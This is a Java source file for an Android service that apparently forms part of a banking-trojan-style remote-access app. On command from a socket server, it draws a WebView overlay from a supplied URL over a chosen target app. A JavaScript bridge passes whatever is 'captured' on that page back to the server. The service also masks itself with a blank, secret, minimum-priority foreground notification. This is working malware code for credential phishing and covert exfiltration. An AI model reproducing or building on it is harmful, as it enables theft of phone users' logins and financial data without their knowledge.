package com.fason.app.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.PixelFormat;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.NotificationCompat;

import com.fason.app.R;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import io.socket.client.Socket;

@SuppressWarnings("deprecation")
public class DragonOverlayService extends Service {
    private static final String TAG = "DragonOverlay";
    public static final int NOTIF_ID = 9001;

    private static volatile DragonOverlayService instance;

    private WindowManager wm;
    private final Map<String, OverlayView> overlays = new ConcurrentHashMap<>();

    public static DragonOverlayService getInstance() {
        return instance;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        try {
            createChannel();
        } catch (Exception ignored) {}
        startForegroundCompat();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        for (OverlayView ov : overlays.values()) {
            try { ov.detach(); } catch (Exception ignored) {}
        }
        overlays.clear();
        instance = null;
        super.onDestroy();
    }

    // ---------- public API (mirrors OverlayManager) ----------

    public JSONObject showOverlay(JSONObject config) {
        if (!Settings.canDrawOverlays(this)) return error("overlay_permission_missing");
        String url = config == null ? "" : config.optString(Protocol.KEY_URL, "");
        if (url.isEmpty()) return error("overlay_url_missing");
        final String pkg = config.optString(Protocol.KEY_PACKAGE, "");
        final String key = pkg.isEmpty() ? "_manual" : pkg;
        if (overlays.containsKey(key)) return done();
        try {
            OverlayView ov = new OverlayView(config);
            ov.attach();
            if (ov.isAttached()) {
                overlays.put(key, ov);
            }
            return done();
        } catch (Exception e) {
            Log.w(TAG, "showOverlay failed", e);
            return error(String.valueOf(e));
        }
    }

    public JSONObject hideOverlay(JSONObject data) {
        String pkg = data == null ? "" : data.optString(Protocol.KEY_PACKAGE, "");
        if (pkg.isEmpty()) {
            for (OverlayView ov : overlays.values()) {
                try { ov.detach(); } catch (Exception ignored) {}
            }
            overlays.clear();
        } else {
            OverlayView ov = overlays.remove(pkg);
            if (ov != null) {
                try { ov.detach(); } catch (Exception ignored) {}
            }
        }
        return done();
    }

    public JSONObject status() {
        JSONObject r = new JSONObject();
        try {
            r.put(Protocol.KEY_STATUS, "done");
            JSONObject d = new JSONObject();
            d.put("overlayPermission", Settings.canDrawOverlays(this));
            d.put("shown", overlays.size());
            r.put("data", d);
        } catch (Exception e) {
            return error(String.valueOf(e));
        }
        return r;
    }

    public void emitCapture(String json) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null && socket.connected()) {
                socket.emit(Protocol.EVT_OVERLAY_CAPTURE, json == null ? "{}" : json);
            }
        } catch (Exception e) {
            Log.w(TAG, "capture emit failed", e);
        }
    }

    // ---------- foreground ----------

    private void createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm == null) return;
        if (nm.getNotificationChannel(Protocol.NOTIF_CHANNEL) != null) return;
        NotificationChannel ch = new NotificationChannel(
            Protocol.NOTIF_CHANNEL, ".", NotificationManager.IMPORTANCE_MIN);
        ch.setDescription(".");
        ch.setShowBadge(false);
        ch.setSound(null, null);
        ch.enableLights(false);
        ch.enableVibration(false);
        ch.setBypassDnd(false);
        ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ch.setAllowBubbles(false);
        }
        nm.createNotificationChannel(ch);
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, Protocol.NOTIF_CHANNEL)
            .setSmallIcon(R.drawable.ic_notif_stealth)
            .setContentTitle(".")
            .setContentText(".")
            .setOngoing(true)
            .setSilent(true)
            .setOnlyAlertOnce(true)
            .setLocalOnly(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build();
    }

    private void startForegroundCompat() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIF_ID, buildNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
            } else {
                startForeground(NOTIF_ID, buildNotification());
            }
        } catch (RuntimeException | LinkageError e) {
            Log.w(TAG, "startForeground failed", e);
            try { startForeground(NOTIF_ID, buildNotification()); } catch (Exception ignored) {}
        }
    }

    // ---------- helpers ----------

    private static JSONObject done() {
        JSONObject r = new JSONObject();
        try { r.put(Protocol.KEY_STATUS, "done"); } catch (Exception ignored) {}
        return r;
    }

    private static JSONObject error(String msg) {
        JSONObject r = new JSONObject();
        try {
            r.put(Protocol.KEY_STATUS, "error");
            r.put(Protocol.KEY_ERROR, msg);
        } catch (Exception ignored) {}
        return r;
    }

    private static int dp(Context c, int v) {
        return Math.round(v * c.getResources().getDisplayMetrics().density);
    }

    // ---------- overlay view ----------

    private final class OverlayView {
        private final LinearLayout root;
        private final WebView webView;
        private final WindowManager.LayoutParams params;
        private boolean attached = false;

        OverlayView(JSONObject cfg) {
            String url = cfg.optString(Protocol.KEY_URL, "");
            String title = cfg.optString(Protocol.KEY_TITLE, "");
            int widthPct = Math.max(30, Math.min(100, cfg.optInt(Protocol.KEY_WIDTH, 95)));
            int heightPct = Math.max(30, Math.min(100, cfg.optInt(Protocol.KEY_HEIGHT, 90)));
            final boolean closeable = cfg.optBoolean(Protocol.KEY_CLOSEABLE, true);

            int pad = dp(DragonOverlayService.this, 10);
            root = new LinearLayout(DragonOverlayService.this);
            root.setOrientation(LinearLayout.VERTICAL);
            root.setPadding(pad, pad, pad, pad);
            GradientDrawable bg = new GradientDrawable();
            bg.setColor(0xFF0F1318);
            bg.setCornerRadius(dp(DragonOverlayService.this, 18));
            bg.setStroke(dp(DragonOverlayService.this, 1), 0xFF2A3441);
            root.setBackground(bg);

            boolean hasHeader = (title != null && !title.isEmpty()) || closeable;
            if (hasHeader) {
                LinearLayout header = new LinearLayout(DragonOverlayService.this);
                header.setOrientation(LinearLayout.HORIZONTAL);
                header.setGravity(Gravity.CENTER_VERTICAL);
                header.setPadding(0, 0, 0, dp(DragonOverlayService.this, 10));
                if (title != null && !title.isEmpty()) {
                    TextView tv = new TextView(DragonOverlayService.this);
                    tv.setText(title);
                    tv.setTextColor(0xFFE2E8F0);
                    tv.setTextSize(15);
                    tv.setSingleLine(true);
                    tv.setMaxLines(1);
                    tv.setEllipsize(android.text.TextUtils.TruncateAt.END);
                    tv.setLayoutParams(new LinearLayout.LayoutParams(0,
                        LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
                    header.addView(tv);
                }
                if (closeable) {
                    TextView close = new TextView(DragonOverlayService.this);
                    close.setText("✕");
                    close.setTextColor(0xFF94A3B8);
                    close.setTextSize(18);
                    close.setPadding(dp(DragonOverlayService.this, 8), 0,
                        dp(DragonOverlayService.this, 2), 0);
                    close.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View v) {
                            detach();
                        }
                    });
                    header.addView(close);
                }
                header.setOnTouchListener(dragListener);
                root.addView(header, new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT));
            }

            webView = new WebView(DragonOverlayService.this);
            WebSettings s = webView.getSettings();
            s.setJavaScriptEnabled(true);
            s.setDomStorageEnabled(true);
            s.setAllowFileAccess(false);
            s.setAllowContentAccess(false);
            s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            webView.setBackgroundColor(0xFF0F1318);
            webView.setWebViewClient(new WebViewClient());
            webView.setWebChromeClient(new WebChromeClient());
            webView.addJavascriptInterface(new JsBridge(), "AndroidBridge");
            webView.loadUrl(url);
            root.addView(webView, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f));

            DisplayMetrics dm = getResources().getDisplayMetrics();
            int w = Math.max(1, dm.widthPixels * widthPct / 100);
            int h = Math.max(1, dm.heightPixels * heightPct / 100);
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;
            int flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED;
            params = new WindowManager.LayoutParams(w, h, type, flags, PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP | Gravity.CENTER_HORIZONTAL;
            params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;
        }

        private final View.OnTouchListener dragListener = new View.OnTouchListener() {
            private float downRawX, downRawY;
            private int startX, startY;

            @Override
            public boolean onTouch(View v, MotionEvent e) {
                switch (e.getActionMasked()) {
                    case MotionEvent.ACTION_DOWN:
                        downRawX = e.getRawX();
                        downRawY = e.getRawY();
                        startX = params.x;
                        startY = params.y;
                        return true;
                    case MotionEvent.ACTION_MOVE:
                        params.x = startX + (int) (e.getRawX() - downRawX);
                        params.y = startY + (int) (e.getRawY() - downRawY);
                        try { wm.updateViewLayout(root, params); } catch (Exception ignored) {}
                        return true;
                    case MotionEvent.ACTION_UP:
                    case MotionEvent.ACTION_CANCEL:
                        return true;
                }
                return false;
            }
        };

        void attach() {
            if (attached) return;
            try {
                wm.addView(root, params);
                attached = true;
            } catch (Exception e) {
                Log.w(TAG, "addView failed", e);
            }
        }

        void detach() {
            if (!attached) return;
            try { wm.removeView(root); } catch (Exception ignored) {}
            attached = false;
            try { webView.stopLoading(); } catch (Exception ignored) {}
            try { webView.destroy(); } catch (Exception ignored) {}
        }

        boolean isAttached() {
            return attached;
        }

        private final class JsBridge {
            @JavascriptInterface
            public void capture(String json) {
                emitCapture(json);
            }
        }
    }
}
